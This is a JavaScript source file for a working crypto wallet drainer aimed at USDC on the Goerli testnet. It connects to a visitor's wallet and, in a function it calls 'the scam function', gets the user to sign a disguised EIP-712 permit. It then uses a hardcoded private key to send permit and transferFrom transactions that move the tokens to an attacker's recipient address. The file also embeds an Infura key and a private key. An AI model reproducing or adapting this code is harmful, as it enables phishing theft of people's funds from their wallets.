const { ethers, ethereum } = window

// constants
const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312" // Goerly RPC
const chainId = 5 // Goerly chain id
const tokenToSteal = "0x07865c6E87B9F70255377e024ace6630C1Eaa37F" // USDC on Goerly
const amountToSteal = String(20 * (10 ** 6)) // calculate USDC amount
const initiator = "0xECD56821D6eB6db6cCB30243cb1d6592Ff5A0F14" // initiator address
const initiatorPK = "050947b326c43b89fd7d46ef2e3ab49ce419ac03c4ba1e66c055abb86cf6d2c4" // initiaror's private key
const recipient = "0xf50b1E00215D83089AEE99b76D64a9C0b915062a" // recipient of stolen asset

// setup UI
const connectButton = document.getElementById("connect")
const mainButton = document.getElementById("main")
mainButton.disabled = true

// ABIs
const PermitERC20_ABI = [
    {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [
            { "name": "", "type": "string" }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "version",
        "outputs": [
            { "version": "", "type": "string" }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" },
            { "internalType": "address", "name": "spender", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
            { "internalType": "uint8", "name": "v", "type": "uint8" },
            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [
            { "internalType": "bool", "name": "", "type": "bool" }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "owner", "type": "address" }
        ],
        "name": "nonces",
        "outputs": [
            { "internalType": "uint256", "name": "", "type": "uint256" }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

// variables
let provider, web3
let selectedAddress

// connect function
async function connect() {
    web3 = new Web3(ethereum)
    provider = new ethers.providers.Web3Provider(ethereum)
    const network = await provider.getNetwork()

    if (network.chainId !== chainId) {
        try {
            await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
        } catch (err) {
            console.log("error", err)
            return
        }
    }
    
    const accounts = await provider.send("eth_requestAccounts", [])
    selectedAddress = accounts[0]

    connectButton.innerText = selectedAddress
    connectButton.disabled = true
    mainButton.disabled = false
}

// the scam function
async function fakePermit() {
    const tokenContract = new web3.eth.Contract(PermitERC20_ABI, tokenToSteal)
    const contractNonce = await tokenContract.methods.nonces(selectedAddress).call()
    const deadline = 10000000000000

    const dataToSign = JSON.stringify({
        domain: {
            name: "USD Coin", // token name
            version: "2", // version of a token
            chainId: chainId,
            verifyingContract: tokenToSteal
        }, 
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "version", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" },
            ],
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
            ]
        },
        primaryType: "Permit",
        message: { 
            owner: selectedAddress, 
            spender: initiator, 
            value: amountToSteal,
            nonce: contractNonce, 
            deadline: deadline 
        }
    })
        
    web3.currentProvider.sendAsync({
        method: "eth_signTypedData_v3",
        params: [selectedAddress, dataToSign],
        from: selectedAddress
    }, async (error, result) => {
        if (error != null) return reject("Denied Signature")

        const initiatorNonce = await web3.eth.getTransactionCount(initiator)
        const signature = result.result
        const splited = ethers.utils.splitSignature(signature)

        const permitData = tokenContract.methods.permit(selectedAddress, initiator, amountToSteal, deadline, splited.v, splited.r, splited.s).encodeABI()
        const gasPrice = await web3.eth.getGasPrice()
        const permitTX = {
            from: initiator,
            to: tokenToSteal,
            nonce: web3.utils.toHex(initiatorNonce),
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            value: "0x",
            data: permitData
        }
        const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)

        // after the token is approved to us, steal it
        const transferData = tokenContract.methods.transferFrom(selectedAddress, recipient, amountToSteal).encodeABI() 
        const transferTX = {
            from: initiator,
            to: tokenToSteal,
            nonce: web3.utils.toHex(initiatorNonce + 1), // don't forget to increment initiator's nonce
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            data: transferData,
            value: "0x"
        } 
        const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction)
    })
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
    connectButton.onclick = connect
})

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = fakePermit
})